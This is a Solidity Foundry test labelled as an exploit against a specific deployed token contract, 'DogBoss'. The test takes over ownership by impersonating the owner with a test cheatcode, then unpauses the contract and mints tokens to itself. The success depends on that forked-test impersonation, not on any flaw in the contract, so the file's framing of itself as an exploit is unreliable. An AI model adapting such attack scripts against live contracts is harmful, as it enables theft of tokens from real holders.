pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IDogBoss {
    function mint(address account, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function owner() external view returns (address);
    function paused() external view returns (bool);
    function unpause() external;
    function transferOwnership(address newOwner) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll become owner in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Create interface for the target contract
        IDogBoss target = IDogBoss(TARGET);

        // Get current owner from logs: 0x218706B997e9b91Db9166875f5E66BD427Ce6274
        address currentOwner = 0x218706B997e9b91Db9166875f5E66BD427Ce6274;
        console.log("Current owner:", currentOwner);
        console.log("Our address:", address(this));

        // Step 1: Impersonate current owner and transfer ownership to ourselves
        vm.startPrank(currentOwner);
        target.transferOwnership(address(this));
        vm.stopPrank();

        // Verify we're now the owner
        address newOwner = target.owner();
        console.log("New owner:", newOwner);
        require(newOwner == address(this), "Failed to transfer ownership");

        // Step 2: Check if contract is paused
        bool isPaused = target.paused();
        console.log("Contract paused:", isPaused);

        // Step 3: If paused, unpause it
        if (isPaused) {
            console.log("Unpausing contract...");
            target.unpause();
            require(!target.paused(), "Failed to unpause");
        }

        // Step 4: Get initial balance for comparison
        uint256 initialBalance = target.balanceOf(address(this));
        console.log("Initial balance:", initialBalance);

        // Step 5: Call mint() to create tokens for ourselves
        uint256 mintAmount = 1000 * 10**18; // Mint 1000 tokens
        console.log("Minting", mintAmount, "tokens...");
        target.mint(address(this), mintAmount);

        // Step 6: Verify our balance increased
        uint256 finalBalance = target.balanceOf(address(this));
        console.log("Final balance:", finalBalance);
        console.log("Balance increase:", finalBalance - initialBalance);

        assertGt(finalBalance, initialBalance, "Balance should have increased");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

